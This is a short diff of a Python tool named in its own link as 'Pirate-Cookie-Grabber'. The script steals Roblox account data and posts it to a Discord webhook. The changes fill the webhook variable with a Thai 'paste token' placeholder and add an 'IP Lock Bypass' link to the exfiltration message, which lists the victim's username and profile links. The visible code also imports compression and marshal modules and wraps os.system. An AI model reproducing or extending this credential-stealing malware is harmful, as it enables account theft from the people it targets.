@@ -4,7 +4,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-webhookk = ""
+webhookk = "วางโทเค่น"
 
 def command(c):
     os.system(c)
@@ -118,7 +118,7 @@ discord.post(
         {
             "username": "BOT - Pirate 🍪",
             "title": "💸 +1 Result Account 🕯",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) | [Roblox IP Lock Bypass](https://rbxfresh.org/)",
             "color" : 12452044,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
